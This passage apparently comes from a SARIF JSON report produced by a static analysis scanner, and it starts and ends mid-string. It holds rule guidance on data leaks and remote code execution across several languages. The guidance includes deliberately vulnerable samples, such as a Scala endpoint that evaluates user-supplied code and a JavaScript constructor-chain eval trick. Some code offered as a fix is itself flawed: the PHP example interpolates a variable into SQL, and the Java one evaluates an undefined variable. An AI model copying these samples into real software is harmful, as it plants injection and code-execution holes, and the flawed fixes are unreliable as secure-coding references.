http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/16e4fe8afd8c399237f33de0a1b5f9506be326e6a04568ae67ecca4e919c34bb",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability."
                            },
                            "help": {
                                "markdown": "The code executed here is not a string literal. When unescaped attacker-controlled inputs are used as part of the executed code this indicates a remote code execution vulnerability.\n\n# Remote Code Execution\n\nA **remote code execution** (RCE) vulnerability allows an attacker to execute arbitrary code on you server. On a\nweb-server, RCE vulnerabilities are typically cause when untrusted input from the HTTP request is evaluated as code.\n\n::::tabs\n\n:::tab[Java]\n\n## Remote Code Execution in Java\n\nDynamic evaluation of code in Java can be achieved in a number of ways. The Java scripting API (defined in the\n`javax.script` page) package allows you to evaluate code in a number of different scripting languages via the \n`ScriptEngineManager` class. There are, for instance, JVM compatible versions of Python (called Jython) and Ruby (called\nJRuby) that can be loaded as jars and invoked via the script manager.\n\nThe Java compiler can also be invoked programmatically via the `javax.tools.JavaCompiler` interface. This approach is\noften used by build tools, which convert files on disk to runnable code that can be loaded into the JVM.\n\nFinally, there are a number of other tools that allow dynamic evaluation of code. The Apache Bean Scripting Framework\na range of scripting languages, and the scripting languages like Groovy can be added to the Java runtime by simply\nadding a jar in the classpath.\n\nWith all of these approaches, it is of vital importance that you only pass trusted code to the scripting API. Passing \nuntrusted content to the `ScriptingEngine` class, for instance,  will allow an attacker to execute arbitrary code in \nyour Java Virtual Machine - meaning they can steal sensitive information, read files from disk, or install malware.\n\nTo secure your code, you should ensure any strings passed to a scripting engine are taken from a trusted source, or \nvalidated against an allow-list:\n\n```java\nprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException \n{\n  String code = request.getParameter(\"script\");\n\n  // Since we are taking the code to execute from an untrusted source (the HTTP\n  // request) we *must* validate against an allowed list of scripts.      \n  if (!allowedCommands.contains(code))\n    throw new IOException(\"Not permitted\");\n\n  ScriptEngineManager manager = new ScriptEngineManager();\n  ScriptEngine        engine  = manager.getEngineByName(\"JavaScript\");\n  engine.eval(input);\n  \n  response.setStatus(200);\n}\n```\n\n## Further Considerations\n\nDynamic code evaluation is often used where there is a need to develop a *Domain Specific Language* (DSL) for expert \nusers. In such a scenario, it is preferable to execute DSL statements in a sandbox with limited permissions. (For\ninstance, you probably want to limit disk and network access if you are simply evaluating mathematical statements.) One\nway to achieve this is by formally defining the grammar of the DSL, and using a tool like Java Compiler Compiler (JavaCC)\nor ANTLR to generate a parser that can evaluate scripts at runtime. Since the grammar specification defines which\nfunctions are executable, you have full control over what the DSL can do.\n\n:::\n\n:::tab[C#]\n\n## Remote Code Execution in C#\n\nC# code can be evaluated dynamically using the Code Document Object Model (CodeDOM) module, defined in the \n`System.CodeDom` namespace. CodeDOM allows for templated code generation and dynamic compilation within the .NET \nruntime.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your C# runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to using the CodeDOM module in applications that face\nthe internet.\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in .NET, consider using one of\nthe following solutions:\n\n* Microsoft's DSL Tools, that come bundled with Visual Studio and allow the visual creation of DSLs.\n* A scripting language like Lua that can be dynamically loaded and executed within the .NET runtime.\n* ANTLR, a parser generator that can be used to generate and execute sand-boxed languages.\n\n:::\n\n:::tab[JavaScript]\n\n## Remote Code Execution in JavaScript Using Eval\n\nJavaScript makes dynamic evaluation of strings as code very easy by making the `eval(...)` function available. For\ninstance, the following JavaScript code will print \"WARNING\" to the console:\n\n```javascript\n  eval(\"console.log('WARNING')\")\n```\n\nIf an attacker is able to control the input to an `eval(...)` call by passing it in an HTTP request, they can run code\non your server. This will allow them to scan your file system, install a remote shell, and take over your server \ncompletely.\n\n## Other Types of Remote Code Execution in JavaScript\n\nInput strings can also be dynamically evaluated as code in the JavaScript runtime using the `Function(...)` or\n`Script(...)` constructors. There are various subtle ways of doing this, as illustrated by the following code:\n\n```javascript\nconst arbitraryObject = {},\n      a = 'constructor',\n      b = 'constructor',\n      s = 'console.log(\"Hacked!\")';\n\n// This will print the phrase 'Hacked!' to the console.\narbitraryObject[a][b](s)()\n```\n\nThese two lines of code illustrate an RCE vulnerability. Properties can be looked up on a JavaScript object by name, \nand this includes functions. The illustrated exploit gets the constructor function for an arbitrary object, looks up \nrhe constructor function for the constructor (which is actually `Function(...)`), passes it a command string, then \nexecutes that string. \n\nAlthough this example is contrived, it illustrates how any code that has the form:\n\n```javascript\narbitraryObject[parameterA][parameterB](parameterC)()\n```\n\n...enables a remote execution attack if all the parameters can be controlled by an attacker.\n\n## Mitigation\n\n* Don't use the `eval(...)` function in your code. Check your codebase with a linter as part of your build process.\n* Consider disabling use of `eval(...)` in the Node.js runtime by passing the `--disallow-code-generation-from-strings`\n  at startup. (You will have to ensure none of your dependencies use the `eval(...)` function to do this.)\n* Validate all untrusted input with allow-lists: check any input take from the HTTP request is safe before processing \n  it.\n* If you make nested lookups on objects, make assertions about object types when pulling them from another object. If\n  your code finds a function where it expects a string, don't invoke it!\n\n:::\n\n:::tab[Python]\n\n## Remote Code Execution in Python\n\nPython code can be evaluated dynamically using the global `eval(...)` and `exec(...)` functions. The former expects\na string representing a (single) valid Python expression, while the later can execute multiple expressions - making it \nable to create new module, class, and function definitions. Both functions have access to the global and local state\nat the point of invocation.\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Python runtime -\nmeaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid `eval(...)` and `exec(...)` functions of Python \naltogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Python, consider using the \n`ast` (*Abstract Syntax Tree*) module, which allows you to parse expressions and evaluate each node atomically. This will\nhelp you \"sandbox\" the functions a user can invoke, removing the risks of arbitrary code execution.\n\nHere's a simple example of a DSL that can evaluate mathematical expressions:\n\n```python\nimport ast, operator, math\n\ndef safe_eval(expression):\n  \"\"\"Evaluate a simple mathematical function by parsing an expression into an\n  abstract syntax tree and safely evaluating each node in turn.\"\"\"\n\n  def find_math_function(x, *args):\n    if x not in [x for x in dir(math) if not \"__\" in x]:\n      raise SyntaxError(f\"Unknown function {x}()\")\n\n    return getattr(math, x)\n\n  binary_operations = {\n    ast.Add:   operator.add,\n    ast.Sub:   operator.sub,\n    ast.Mult:  operator.mul,\n    ast.Div:   operator.truediv,\n    ast.Mod:   operator.mod,\n    ast.Pow:   operator.pow,\n    ast.Call:  find_math_function,\n    ast.BinOp: ast.BinOp,\n  }\n\n  unary_operations = {\n    ast.USub:    operator.neg,\n    ast.UAdd:    operator.pos,\n    ast.UnaryOp: ast.UnaryOp,\n  }\n\n  operations = tuple(binary_operations) + tuple(unary_operations)\n\n  syntax_tree = ast.parse(expression, mode='eval')\n\n  def _eval(node):\n    if isinstance(node, ast.Expression):\n      return _eval(node.body)\n    elif isinstance(node, ast.Str):\n      return node.s\n    elif isinstance(node, ast.Num):\n      return node.value\n    elif isinstance(node, ast.Constant):\n      return node.value\n    elif isinstance(node, ast.BinOp):\n      if isinstance(node.left, operations):\n        left = _eval(node.left)\n      else:\n        left = node.left.value\n      if isinstance(node.right, operations):\n        right = _eval(node.right)\n      else:\n        right = node.right.value\n      return binary_operations[type(node.op)](left, right)\n    elif isinstance(node, ast.UnaryOp):\n      if isinstance(node.operand, operations):\n        operand = _eval(node.operand)\n      else:\n        operand = node.operand.value\n      return unary_operations[type(node.op)](operand)\n    elif isinstance(node, ast.Call):\n      args = [_eval(x) for x in node.args]\n      function = find_math_function(node.func.id)\n      return function(*args)\n    else:\n      raise SyntaxError(f\"Bad syntax, {type(node)}\")\n\n  return _eval(syntax_tree)\n\nsafe_eval(\"1 + 1\")       # Will return 2\nsafe_eval(\"(100*10)+6\")  # Will return 1006\nsafe_eval(\"sqrt(16)+1\")  # Will return 5.0\n```\n\n:::\n\n:::tab[Scala]\n\n## Remote Code Execution in Scala\n\nScala code can be evaluated dynamically using the `scala-lang` package, that will generate bytecode objects to be loaded \ninto the underlying Java Virtual Machine. The following web-application takes a scriptlet from an HTTP parameter and\nevaluates the result:\n\n```scala\ncase class Scriptlet(code: String)\n\ndef scriptExecutionForm = Form(\n  mapping(\n    \"code\" -> text\n  )(Scriptlet.apply)(Scriptlet.unapply)\n)\n\ndef evaluateScript = Action(parse.form(scriptExecutionForm)) { request =>\n  val settings = new Settings\n\n  settings.usejavacp.value   = true\n  settings.deprecation.value = true\n\n  val eval      = new IMain(settings)\n  val evaluated = eval.interpret(request.body.code)\n\n  if (evaluated == Success) {\n    val result = eval.valueOfTerm(\"result\").get.asInstanceOf[String]\n    Ok(result)\n  }\n  else {\n    Status(488)(\"Unable to evaluate this code\")\n  }\n}\n```\n\nAnother common method of achieving dynamic execution in Scala is by using reflection:\n\n```scala\nimport scala.reflect.runtime.universe\nimport scala.tools.reflect.ToolBox\n\nval toolbox = universe.runtimeMirror(getClass.getClassLoader).mkToolBox()\ntoolbox.eval(toolbox.parse(\"\"\"println(\"Hello world\")\"\"\"))\n```\n\nPassing untrusted string as code to be evaluated allows an attacker to execute arbitrary code in your Java Virtual \nMachine - meaning they can steal sensitive information, read files from disk, or install malware. This is very \ndangerous!\n\nTo mitigate remote code execution attacks, you must ensure any strings are taken from a trusted source, or validated \nagainst an allow-list. To be totally secure, it's often better to avoid using dynamic evaluation of Scala altogether. \n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Scala, consider using a\ntoolkit like the Scala Standard Parser Combinator Library, which allows you to write parsers that will \"sandbox\" the \nfunctions a user can invoke, removing the risks of arbitrary code execution.\n\nThe `math-expression-parser` library is good example of a well-scoped DSL that allows evaluation of simple arithmetic\nexpressions:\n\n```scala\nimport io.github.facaiy.math.expression.MathExp\n\nval expressionString = \"1.0 + sqrt(2 * $a1) + $a2 ** 2\"\nval parsedExpression = MathExp.parse(expressionString)\nval inputVariables   = Map(\"a1\" -> 2, \"a2\" -> 1)\n\n// This will return the value \"4.0\", by evaluating the expression with the supplied input variables.\nval output = parsedExpression.eval(inputVariables)\n```\n\n:::\n\n:::tab[Go]\n\n## Remote Code Execution in Go\n\nDynamic execution of Go is relatively rare. The Go playground (https://go.dev/play/) allows you to run Go code from a\nweb browser, and achieves this by dynamically compiling code using the Go toolchain, and executing the compiled code in\na sandbox on a remote server.\n\nMore common is the use of packages like `net/rpc` or `grpc` to allow remote invocation of individual methods across a \nnetwork. This allows a development team to build efficient, distributed micro-services.\n\nTo mitigate remote code execution attacks in a distributed computing environment, you must ensure any procedure calls \ncome from a trusted source. With `grpc` this can be achieved using Application Layer Transport Security (ALTS), a mutual \nauthentication and transport developed by Google:\n\n```go\nimport (\n  \"google.golang.org/grpc\"\n  \"google.golang.org/grpc/credentials/alts\"\n)\n\naltsTC          := alts.NewClientCreds(alts.DefaultClientOptions())\nconnection, err := grpc.Dial(serverAddr, grpc.WithTransportCredentials(altsTC))\n```\n\n## Domain Specific Languages\n\nDynamic evaluation is often used to build *Domain Specific Languages* (DSLs) that allow expert users to write simple\nexpressions that query data or encode business logic. If you find yourself writing a DSL in Go, consider using an \nembeddable scripting language like Lua:\n\n```go\nimport (\n  \"github.com/yuin/gopher-lua\"\n)\n\nfunc main() {\n  // Instantiate a Lua sandbox.\n  sandbox := lua.NewState()\n  \n  defer sandbox.Close()\n  \n  // Dynamically execute a string as Lua code.\n  if err := sandbox.DoString(`print(\"hello\")`); err != nil {\n    panic(err)\n  }\n}\n```\n\nThis example will execute the simple Lua expression `print(\"hello\")`. Using a Lua sandbox in this fashion will allow you \nto execute dynamic expressions passed by a user safely - simply pass the expression to the `sandbox.DoString(...)` \nfunction to execute it. The executed code will *only* be able to access state you pass to the sandbox via the \n`sandbox.SetField(...)` function, closing any security loopholes associated with remote code execution.\n\n:::\n\n:::tab[PHP]\n\n## Remote Code Execution in PHP\n\nPHP provides several functions that allow for the execution of system commands and the evaluation of code dynamically. Some commonly used functions for this purpose include 